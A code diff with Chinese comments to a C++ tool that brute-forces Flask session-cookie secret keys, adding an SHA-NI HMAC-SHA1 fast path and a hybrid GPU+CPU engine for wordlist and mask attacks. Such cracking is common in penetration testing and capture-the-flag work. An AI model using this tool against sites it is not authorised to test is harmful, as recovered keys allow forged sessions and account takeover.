@@ -7,11 +7,13 @@
 #include "json_mini.h"
 #include "sha1.h"
 
+#include <charconv>
 #include <chrono>
 #include <cstring>
 #include <fstream>
 #include <iostream>
 #include <optional>
+#include <thread>
 #include <zlib.h>
 
 static const char* DEFAULT_SALT = "cookie-session";
@@ -117,7 +119,10 @@ int flaskSign(const std::string& secret, const std::string& jsonText, const std:
     return 1;
   }
   std::string canonical;
-  jsonCanonical(j, canonical);
+  if (!jsonCanonical(j, canonical)) {
+    std::cerr << "[!] JSON 含非法 UTF-8 字节序列" << std::endl;
+    return 1;
+  }
   std::string payload = b64urlEncode((const uint8_t*)canonical.data(), canonical.size());
   // legacy:itsdangerous <1.0 的 EPOCH = 1293840000(2011-01-01 UTC)
   int64_t ts = (int64_t)time(nullptr) - (legacy ? 1293840000 : 0);
@@ -140,6 +145,7 @@ int flaskSign(const std::string& secret, const std::string& jsonText, const std:
 struct VerifyCtx {
   std::string value;   // payload.ts
   std::vector<uint8_t> expect;
+  uint32_t expectW[5] = {0}; // 期望摘要的大端字视图(字域验证用)
   std::string salt;
   HmacFixedMsg saltPc;  // 派生:HMAC(key=cand, msg=salt) 预计算尾块
   HmacFixedMsg valuePc; // 验签:HMAC(key=dk, msg=value) 预计算尾块
@@ -155,10 +161,92 @@ static bool verifyCb(const uint8_t* key, size_t klen, void* v) {
   return diff == 0;
 }
 
+/** key 的第 i 个大端字(不足 4 字节的尾部按零填充) */
+static uint32_t beWordPart(const uint8_t* p, size_t n) {
+  uint32_t w = 0;
+  for (size_t i = 0; i < n; i++) w = (w << 8) | p[i];
+  return w << (8 * (4 - n));
+}
+
+/**
+ * 爆破热路径字域验证:除候选 key 外的一切(尾块/填充/期望摘要)都预转成
+ * 主机序持有的大端字,逐候选只剩 8 次 SHA-NI 纯压缩,免 verifyCb 里
+ * 逐候选的 64B memset/xor 循环/字节域↔字域转换/ob 块重建。
+ * 语义与 verifyCb 完全一致(HMAC(secret,salt)→dk → HMAC(dk,value))。
+ */
+__attribute__((target("sha,sse4.1")))
+static bool verifyFast(const uint8_t* key, size_t klen, void* v) {
+  auto* c = (VerifyCtx*)v;
+  uint32_t kw[16] = {0};
+  if (klen > 64) { // HMAC 规范:超长 key 先 SHA1 折叠
+    uint8_t kb[20];
+    Sha1 h;
+    h.update(key, klen);
+    h.final(kb);
+    for (int i = 0; i < 5; i++) kw[i] = beWordPart(kb + i * 4, 4);
+  } else {
+    int nw = (int)((klen + 3) >> 2);
+    for (int i = 0; i < nw; i++) {
+      size_t off = (size_t)i * 4;
+      kw[i] = beWordPart(key + off, klen - off < 4 ? klen - off : 4);
+    }
+  }
+  constexpr uint32_t X36 = 0x36363636, X5C = 0x5C5C5C5C;
+  uint32_t w[16], st[5];
+  // ---- HMAC(key, salt) → dk ----
+  for (int i = 0; i < 16; i++) w[i] = kw[i] ^ X36;
+  sha1Iv(st);
+  sha1niBlocksW(st, w, 1);
+  sha1niBlocksW(st, c->saltPc.tailw.data(), c->saltPc.tailw.size() / 16);
+  uint32_t inner1[5] = {st[0], st[1], st[2], st[3], st[4]};
+  for (int i = 0; i < 16; i++) w[i] = kw[i] ^ X5C;
+  sha1Iv(st);
+  sha1niBlocksW(st, w, 1);
+  // 外层尾块:digest(20B)||0x80||0…||(64+20)*8 = 0x2A0
+  for (int i = 0; i < 5; i++) w[i] = inner1[i];
+  w[5] = 0x80000000;
+  for (int i = 6; i < 15; i++) w[i] = 0;
+  w[15] = 0x2A0;
+  sha1niBlocksW(st, w, 1);
+  uint32_t dk[5] = {st[0], st[1], st[2], st[3], st[4]};
+  // ---- HMAC(dk, value) → mac ----
+  for (int i = 0; i < 5; i++) w[i] = dk[i] ^ X36;
+  for (int i = 5; i < 16; i++) w[i] = X36; // dk 为 20B,零填充区 ^0x36
+  sha1Iv(st);
+  sha1niBlocksW(st, w, 1);
+  sha1niBlocksW(st, c->valuePc.tailw.data(), c->valuePc.tailw.size() / 16);
+  uint32_t inner2[5] = {st[0], st[1], st[2], st[3], st[4]};
+  for (int i = 0; i < 5; i++) w[i] = dk[i] ^ X5C;
+  for (int i = 5; i < 16; i++) w[i] = X5C;
+  sha1Iv(st);
+  sha1niBlocksW(st, w, 1);
+  for (int i = 0; i < 5; i++) w[i] = inner2[i];
+  w[5] = 0x80000000;
+  for (int i = 6; i < 15; i++) w[i] = 0;
+  w[15] = 0x2A0;
+  sha1niBlocksW(st, w, 1);
+  return st[0] == c->expectW[0] && st[1] == c->expectW[1] && st[2] == c->expectW[2] &&
+         st[3] == c->expectW[3] && st[4] == c->expectW[4];
+}
+
 static void report(const CrackResult& r, const char* engineName) {
   double rate = r.seconds > 0 ? r.attempts / r.seconds : 0;
   std::cerr << "[*] 引擎 " << engineName << ",尝试 " << r.attempts << " 个,耗时 "
             << r.seconds << " s," << (uint64_t)rate << "/s" << std::endl;
+}
+
+/**
+ * auto 模式 GPU 介入的最小候选数:冷进程 OpenCL 初始化 ~0.1s,小任务 CPU 反而快
+ * (实测 CPU ~100M/s,GPU ~740M/s;冷进程盈亏平衡约 800 万)。
+ * serve 常驻进程上下文已就绪(gpuWarm),降为 150 万;ZK_GPUTHRESH 可强制覆盖。
+ */
+static uint64_t gpuThreshold() {
+  if (const char* v = std::getenv("ZK_GPUTHRESH")) {
+    uint64_t n = 0;
+    std::from_chars(v, v + std::strlen(v), n);
+    if (n > 0) return n;
+  }
+  return gpuWarm() ? 1500000 : 8000000;
 }
 
 int flaskCrack(const std::string& cookie, const std::string& wordlist, const std::string& mask,
@@ -179,11 +267,12 @@ int flaskCrack(const std::string& cookie, const std::string& wordlist, const std
     std::cerr << "[!] 签名段不是合法的 20 字节 HMAC-SHA1" << std::endl;
     return 1;
   }
+  beWords20(ctx.expect.data(), ctx.expectW);
+  // 热路径验证器:SHA-NI 可用走字域快速路径,否则字节域便携路径
+  bool (*verify)(const uint8_t*, size_t, void*) = hasShaNi() ? verifyFast : verifyCb;
 
   const bool useGpu = engine != "cpu";
-  // auto 模式按工作量选引擎:GPU 进程初始化 ~0.1s,小任务 CPU 反而快
-  // (CPU ~50M/s,GPU ~140M/s + 0.1s 初始化,盈亏平衡约 800 万候选)
-  const uint64_t GPU_THRESHOLD = 8000000;
+  const uint64_t gpuTh = gpuThreshold();
   GpuCrackParams gp{ (const uint8_t*)ctx.value.data(), ctx.value.size(), {}, 
                      (const uint8_t*)ctx.salt.data(), ctx.salt.size() };
   memcpy(gp.expect, ctx.expect.data(), 20);
@@ -212,8 +301,55 @@ int flaskCrack(const std::string& cookie, const std::string& wordlist, const std
       std::cerr << "[!] GPU 参数超限(value ≤ 512B,salt ≤ 32B,掩码 ≤ 24 位)" << std::endl;
       return 1;
     }
-    const bool gpuMask = useGpu && gpuParamsOk && (gpuish || total >= GPU_THRESHOLD);
-    if (gpuMask) {
+    const bool gpuMask = useGpu && gpuParamsOk && (gpuish || total >= gpuTh);
+    if (gpuMask && engine == "auto") {
+      // 混合引擎:GPU 从头升序吃块,CPU 池从尾降序吃块,对向推进互不等待;
+      // 边界重叠块可能被双侧重复验(幂等,仅统计重复),不会漏
+      HybridCtl ctl;
+      ctl.tail.store(total);
+      CrackResult cpuRes;
+      std::thread cpuT([&] { cpuRes = crackCpuMaskRange(pos, threads, verify, &ctx, ctl); });
+      uint64_t idx = 0, gpuAtt = 0;
+      std::string err;
+      auto t0 = std::chrono::steady_clock::now();
+      int rc = gpuCrackMask(gp, pos, total, idx, err, &ctl, &gpuAtt);
+      cpuT.join();
+      auto t1 = std::chrono::steady_clock::now();
+      double secs = std::chrono::duration<double>(t1 - t0).count();
+      if (g_crackAbort.load(std::memory_order_relaxed)) {
+        std::cerr << "[*] 已取消" << std::endl;
+        return 1;
+      }
+      uint64_t attempts = gpuAtt + cpuRes.attempts;
+      double rate = secs > 0 ? attempts / secs : 0;
+      if (cpuRes.found) {
+        std::cerr << "[*] 引擎 GPU+CPU(" << gpuProbe().deviceName << "),CPU 侧命中,耗时 "
+                  << secs << " s,约 " << (uint64_t)rate << "/s" << std::endl;
+        std::cout << cpuRes.secret << std::endl;
+        return 0;
+      }
+      if (rc == 0) {
+        std::string secret = maskCandidate(idx, pos);
+        std::cerr << "[*] 引擎 GPU+CPU(" << gpuProbe().deviceName << "),GPU 侧命中于第 "
+                  << idx + 1 << " 个,耗时 " << secs << " s,约 " << (uint64_t)rate << "/s" << std::endl;
+        std::cout << secret << std::endl;
+        return 0;
+      }
+      if (rc == -1) {
+        if (ctl.head.load() == 0) {
+          // GPU 未认领任何块(初始化即败),CPU 侧已覆盖全空间
+          report(cpuRes, "CPU");
+          std::cerr << "[!] 掩码空间跑完未命中" << std::endl;
+          return 1;
+        }
+        std::cerr << "[*] GPU 中途失败(" << err << "),回退 CPU 全空间补跑" << std::endl;
+        // 落到下方 CPU 路径(重复验无害)
+      } else {
+        std::cerr << "[*] 引擎 GPU+CPU,跑完未命中,耗时 " << secs << " s,约 "
+                  << (uint64_t)rate << "/s" << std::endl;
+        return 1;
+      }
+    } else if (gpuMask) {
       const bool cudaBe = engine == "cuda"; // NVRTC/CUDA 后端(探测档)
       auto t0 = std::chrono::steady_clock::now();
       uint64_t idx = 0;
@@ -247,7 +383,7 @@ int flaskCrack(const std::string& cookie, const std::string& wordlist, const std
       std::cerr << "[*] GPU 不可用(" << err << "),回退 CPU" << std::endl;
     }
 
-    CrackResult r = crackCpuMask(pos, threads, verifyCb, &ctx);
+    CrackResult r = crackCpuMask(pos, threads, verify, &ctx);
     if (g_crackAbort.load(std::memory_order_relaxed)) {
       std::cerr << "[*] 已取消" << std::endl;
       return 1;
@@ -270,35 +406,52 @@ int flaskCrack(const std::string& cookie, const std::string& wordlist, const std
     std::cerr << "[!] 缺少 --wordlist 或 --mask" << std::endl;
     return 1;
   }
-  if (engine == "cuda") { // CUDA 后端探测版只接了掩码
-    std::cerr << "[!] --engine cuda 暂不支持字典模式(请用掩码,或 --engine gpu)" << std::endl;
-    return 2;
-  }
-  std::ifstream f(wordlist, std::ios::binary);
-  if (!f) {
-    std::cerr << "[!] 打不开字典: " << wordlist << std::endl;
+  if (engine == "cpu") { // 纯 CPU:流式单次加载,免 GPU 打包的全量驻留
+    CrackResult r = crackCpuWordlist(wordlist, threads, verify, &ctx);
+    if (g_crackAbort.load(std::memory_order_relaxed)) {
+      std::cerr << "[*] 已取消" << std::endl;
+      return 1;
+    }
+    if (!r.error.empty()) {
+      std::cerr << "[!] " << r.error << std::endl;
+      return 1;
+    }
+    report(r, "CPU");
+    if (r.found) {
+      std::cout << r.secret << std::endl;
+      return 0;
+    }
+    std::cerr << "[!] 字典跑完未命中" << std::endl;
     return 1;
   }
+  // GPU 可能介入:单次加载进内存,GPU 打包与 CPU 收尾(回退/补跑)共用,不再二读文件
   std::vector<std::string> words;
-  std::string line;
-  while (std::getline(f, line)) {
-    while (!line.empty() && (line.back() == '\r' || line.back() == '\n')) line.pop_back();
-    if (!line.empty()) words.push_back(line);
+  {
+    std::ifstream f(wordlist, std::ios::binary);
+    if (!f) {
+      std::cerr << "[!] 打不开字典: " << wordlist << std::endl;
+      return 1;
+    }
+    std::string line;
+    while (std::getline(f, line)) {
+      while (!line.empty() && (line.back() == '\r' || line.back() == '\n')) line.pop_back();
+      if (!line.empty()) words.push_back(line);
+    }
   }
   if (words.empty()) {
     std::cerr << "[!] 字典为空" << std::endl;
     return 1;
   }
-  f.close();
 
   // GPU:打包成定长 stride=32(超长词跳过;auto 模式小字典直接 CPU)
+  const bool gpuish = engine == "gpu" || engine == "cuda";
+  const bool cudaBe = engine == "cuda";
   const bool gpuParamsOk = ctx.value.size() <= 512 && ctx.salt.size() <= 32;
-  if (engine == "gpu" && !gpuParamsOk) {
+  if (gpuish && !gpuParamsOk) {
     std::cerr << "[!] GPU 参数超限(value ≤ 512B,salt ≤ 32B)" << std::endl;
     return 1;
   }
-  const bool gpuDict = useGpu && gpuParamsOk &&
-                       (engine == "gpu" || words.size() >= GPU_THRESHOLD);
+  const bool gpuDict = useGpu && gpuParamsOk && (gpuish || words.size() >= gpuTh);
   if (gpuDict) {
     // 自适应 stride:按最长词向上取 8 的倍数(上限 32),缩小打包缓冲与上传量。
     // kernel 以 stride 为读长上限,词长恰好等于 stride 时结果仍正确,故仅跳 > stride 的词
@@ -317,14 +470,63 @@ int flaskCrack(const std::string& cookie, const std::string& wordlist, const std
       packed.insert(packed.end(), buf, buf + STRIDE);
       idxMap.push_back(i);
     }
-    if (!skippedIdx.empty())
+    if (!skippedIdx.empty() && engine != "auto")
       std::cerr << "[*] GPU 路径跳过 " << skippedIdx.size() << " 个超长词(>" << STRIDE
                 << "B,GPU 跑完后 CPU 补验)" << std::endl;
     if (!idxMap.empty()) {
+      if (engine == "auto") {
+        // 混合引擎:序号空间 = 原字典下标(超长词含在内,CPU 侧天然覆盖,免补验)
+        HybridCtl ctl;
+        ctl.tail.store(words.size());
+        CrackResult cpuRes;
+        std::thread cpuT([&] { cpuRes = crackCpuWordsRange(words, threads, verify, &ctx, ctl); });
+        uint64_t idx = 0, gpuAtt = 0;
+        std::string err;
+        auto t0 = std::chrono::steady_clock::now();
+        int rc = gpuCrackDict(gp, packed.data(), STRIDE, idxMap.size(), idx, err, &ctl, &idxMap,
+                              &gpuAtt);
+        cpuT.join();
+        auto t1 = std::chrono::steady_clock::now();
+        double secs = std::chrono::duration<double>(t1 - t0).count();
+        if (g_crackAbort.load(std::memory_order_relaxed)) {
+          std::cerr << "[*] 已取消" << std::endl;
+          return 1;
+        }
+        uint64_t attempts = gpuAtt + cpuRes.attempts;
+        double rate = secs > 0 ? attempts / secs : 0;
+        if (cpuRes.found) {
+          std::cerr << "[*] 引擎 GPU+CPU(" << gpuProbe().deviceName << "),CPU 侧命中,耗时 "
+                    << secs << " s,约 " << (uint64_t)rate << "/s" << std::endl;
+          std::cout << cpuRes.secret << std::endl;
+          return 0;
+        }
+        if (rc == 0) {
+          std::cerr << "[*] 引擎 GPU+CPU(" << gpuProbe().deviceName << "),GPU 侧命中于第 "
+                    << idx + 1 << " 个,耗时 " << secs << " s,约 " << (uint64_t)rate << "/s" << std::endl;
+          // hybrid 模式下 foundIdx 已被 runChunks 映回原字典序号,直接用,勿再过 idxMap
+          std::cout << words[idx] << std::endl;
+          return 0;
+        }
+        if (rc == -1) {
+          if (ctl.head.load() == 0) {
+            // GPU 未认领任何块(初始化即败),CPU 侧已覆盖全部词(含超长词)
+            report(cpuRes, "CPU");
+            std::cerr << "[!] 字典跑完未命中" << std::endl;
+            return 1;
+          }
+          std::cerr << "[*] GPU 中途失败(" << err << "),回退 CPU 全字典补跑" << std::endl;
+          // 落到下方 CPU 路径(重复验无害)
+        } else {
+          std::cerr << "[*] 引擎 GPU+CPU,跑完未命中,耗时 " << secs << " s,约 "
+                    << (uint64_t)rate << "/s" << std::endl;
+          return 1;
+        }
+      } else {
       auto t0 = std::chrono::steady_clock::now();
       uint64_t idx = 0;
       std::string err;
-      int rc = gpuCrackDict(gp, packed.data(), STRIDE, idxMap.size(), idx, err);
+      int rc = cudaBe ? cudaCrackDict(gp, packed.data(), STRIDE, idxMap.size(), idx, err)
+                      : gpuCrackDict(gp, packed.data(), STRIDE, idxMap.size(), idx, err);
       auto t1 = std::chrono::steady_clock::now();
       double secs = std::chrono::duration<double>(t1 - t0).count();
       if (g_crackAbort.load(std::memory_order_relaxed)) {
@@ -333,33 +535,33 @@ int flaskCrack(const std::string& cookie, const std::string& wordlist, const std
       }
       if (rc == 0) {
         double rate = secs > 0 ? (idx + 1) / secs : 0;
-        std::cerr << "[*] 引擎 GPU(" << gpuProbe().deviceName << "),命中于第 " << idx + 1
-                  << " 个,耗时 " << secs << " s,约 " << (uint64_t)rate << "/s" << std::endl;
+        std::cerr << "[*] 引擎 " << (cudaBe ? "GPU-CUDA(" : "GPU(")
+                  << (cudaBe ? cudaProbe().deviceName : gpuProbe().deviceName) << "),命中于第 "
+                  << idx + 1 << " 个,耗时 " << secs << " s,约 " << (uint64_t)rate << "/s" << std::endl;
         std::cout << words[idxMap[idx]] << std::endl;
         return 0;
       }
       if (rc == 1) {
         // GPU 未命中:补验被跳过的超长词,避免漏报
         for (size_t i : skippedIdx) {
-          if (verifyCb((const uint8_t*)words[i].data(), words[i].size(), &ctx)) {
+          if (verify((const uint8_t*)words[i].data(), words[i].size(), &ctx)) {
             std::cerr << "[*] 引擎 GPU+CPU 补验,命中超长词,耗时 " << secs << " s" << std::endl;
             std::cout << words[i] << std::endl;
             return 0;
           }
         }
-        std::cerr << "[*] 引擎 GPU,跑完未命中,耗时 " << secs << " s,约 "
+        std::cerr << "[*] 引擎 " << (cudaBe ? "GPU-CUDA" : "GPU") << ",跑完未命中,耗时 " << secs << " s,约 "
                   << (uint64_t)(secs > 0 ? idxMap.size() / secs : 0) << "/s" << std::endl;
         return 1;
       }
-      if (engine == "gpu") {
-        std::cerr << "[!] GPU 路径失败: " << err << std::endl;
-        return 1;
+      // 显式 gpu/cuda 引擎:GPU 失败直接报错,不静默回退
+      std::cerr << "[!] GPU 路径失败: " << err << std::endl;
+      return 1;
       }
-      std::cerr << "[*] GPU 不可用(" << err << "),回退 CPU" << std::endl;
     }
   }
 
-  CrackResult r = crackCpuWordlist(wordlist, threads, verifyCb, &ctx);
+  CrackResult r = crackCpuWords(words, threads, verify, &ctx);
   if (g_crackAbort.load(std::memory_order_relaxed)) {
     std::cerr << "[*] 已取消" << std::endl;
     return 1;
